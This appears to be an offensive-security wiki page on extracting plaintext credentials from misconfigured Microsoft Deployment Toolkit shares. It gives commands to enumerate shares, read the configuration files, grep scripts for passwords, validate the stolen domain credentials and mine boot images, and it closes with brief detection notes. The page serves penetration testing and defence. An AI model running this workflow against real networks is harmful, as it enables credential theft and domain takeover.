---
title: MDT Credential Extraction
permalink: /wiki/offsec-notes/concepts/mdt-credential-extraction/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
---

# MDT Credential Extraction

**Category:** Credential Access / Internal Recon
**MITRE ATT&CK:** T1552.001 — Credentials In Files; T1083 — File and Directory Discovery
**Related:** [Active Directory Attacks](/wiki/offsec-notes/concepts/active-directory-attacks/), [Post Exploitation](/wiki/offsec-notes/concepts/post-exploitation/), [Lateral Movement](/wiki/offsec-notes/concepts/lateral-movement/)

## Overview
Microsoft Deployment Toolkit (MDT) is an OS deployment solution commonly deployed without the access controls the documentation recommends. When the deployment share is readable by all authenticated domain users, it exposes plaintext domain join credentials, service account passwords, local admin passwords, and SQL credentials stored in configuration files. On engagements, MDT shares routinely yield high-privilege accounts.

## Why MDT Gets Overlooked
SCCM gets all the research attention. MDT presents the same credential exposure opportunities — sometimes with less effort. MDT is frequently misconfigured to share its deployment share to all users.

## Finding MDT

### Registry Tattoo (Reconnaissance Signal)
Any machine deployed via standard MDT task sequence gets "tattooed" with deployment metadata:
```powershell
reg query "HKLM\Software\Microsoft\Deployment 4"
```
If this key exists, MDT is used in the environment. Find the MDT server.

### Locating the Server
```bash
# SMB share enumeration
nxc smb <subnet> --shares | grep -i deploy
nxc smb <subnet> -u <user> -p <pass> --shares

# Common share names: DeploymentShare$, MDT$, Deploy$, REMINST
# NetBIOS/DNS: look for servers named MDT, SCCM, WDS, DEPLOY
```

## Credential Locations

### Primary Files (Most Reliable)
```
DeploymentShare\Control\Bootstrap.ini
DeploymentShare\Control\CustomSettings.ini
```

Bootstrap.ini is embedded in boot media (LiteTouch WIM/ISO) for LTI deployments — contains the UserID/UserPassword needed to connect to the deployment share before the OS installs.

CustomSettings.ini is the main MDT configuration — contains deployment-time settings including domain join credentials.

### Task Sequence Files
```
DeploymentShare\Control\<TASKSEQUENCENAME>\ts.xml
```
Custom "Run Command Line" steps with elevated credentials are stored here in plaintext.

### Unattend Files
```
DeploymentShare\Control\<TASKSEQUENCENAME>\unattend.xml
```
Windows setup answer file — often contains hardcoded local Administrator password.

### Scripts and Applications
```
DeploymentShare\Scripts\         (custom scripts, look for ones with different timestamps)
DeploymentShare\Applications\    (application install scripts may have credentials)
```

Sort by date modified — scripts that don't match the MDT standard file timestamps are custom additions worth examining.

## Credential Properties to Hunt

| Property | Purpose |
|----------|---------|
| `DomainAdmin` | Account used to join machines to domain |
| `DomainAdminPassword` | Password for domain join |
| `UserID` | Account for accessing the deployment share |
| `UserPassword` | Password for deployment share access |
| `AdminPassword` | Local Administrator password |
| `DBID` | SQL server account for MDT database |
| `DBPwd` | SQL server password |
| `OSDBitLockerRecoveryPassword` | BitLocker recovery key |
| `ADDSUserName` | DC promotion account (rare) |
| `SafeModeAdminPassword` | AD restore mode password (rare) |
| `TPMOwnerPassword` | TPM password |

## Exploitation Workflow
```
1. Enumerate shares on subnet → find DeploymentShare
2. Mount/browse the share:
   net use Z: \\<MDT_SERVER>\DeploymentShare$
   
3. Read credential files:
   type Z:\Control\Bootstrap.ini
   type Z:\Control\CustomSettings.ini

4. Check all task sequence folders:
   dir Z:\Control\
   for each folder: type Z:\Control\<TS>\ts.xml
                    type Z:\Control\<TS>\unattend.xml

5. Grep scripts for passwords:
   findstr /si "password" Z:\Scripts\*.ps1 Z:\Scripts\*.bat Z:\Scripts\*.vbs

6. Validate credentials:
   nxc smb <DC> -u DomainAdmin -p <found_password>
```

## Boot Media (Bonus)
If you find `LiteTouchPE_x86.iso`, `LiteTouchPE_x64.iso`, `LiteTouchPE_x86.wim`, or `LiteTouchPE_x64.wim` on any IT share:
```bash
# Mount/extract and search for Bootstrap.ini inside
7z e LiteTouchPE_x64.iso
# or mount WIM
dism /Mount-Wim /WimFile:LiteTouchPE_x64.wim /index:1 /MountDir:C:\mnt
type C:\mnt\Deploy\Control\Bootstrap.ini
```
The embedded Bootstrap.ini contains credentials in plaintext. IT shares these ISOs for making USB sticks — low-scrutiny storage.

## Impact Assessment
The `DomainAdmin` property (account used to join machines to AD) often:
- Has been reused as DA or with elevated privileges beyond necessary
- Has been used to join every server → owning it = owning all joined infrastructure
- May literally be a member of Domain Admins (seen in real engagements)

## Detection Notes
- Access to `DeploymentShare\Control\Bootstrap.ini` outside of deployment windows is suspicious
- SIEM rule: file access to `Bootstrap.ini` or `CustomSettings.ini` by non-service accounts
- Deploy share should require specific service account credentials, not broad AD access

## References
- TrustedSec — "Red Team Gold: Extracting Credentials from MDT Shares" (2025-05-20)
- Microsoft MDT documentation — learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/deployment/deploy-windows-mdt
- MDT Properties reference — learn.microsoft.com/en-us/intune/configmgr/mdt/properties
